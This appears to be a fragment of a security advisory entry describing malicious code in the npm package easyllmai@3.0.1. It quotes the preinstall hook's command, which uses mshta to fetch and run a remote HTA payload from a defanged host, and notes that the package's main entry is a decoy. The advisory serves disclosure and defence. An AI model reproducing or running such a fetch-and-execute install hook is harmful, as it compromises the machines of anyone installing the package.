  "summary": "Malicious code in easyllmai (npm)",
  "details": "Easyllmai@3.0.1 uses its preinstall lifecycle hook to download and execute arbitrary remote code. On install, preinstall.js runs 'cmd /c \"mshta hxxp://fixars[.]top\"' which fetches and executes an HTA payload from fixars[.]top using the Windows Mshta LOLBin. The package's main entry (index.js) is a harmless decoy greeting function; the malicious behaviour occurs during installation, before any require().",
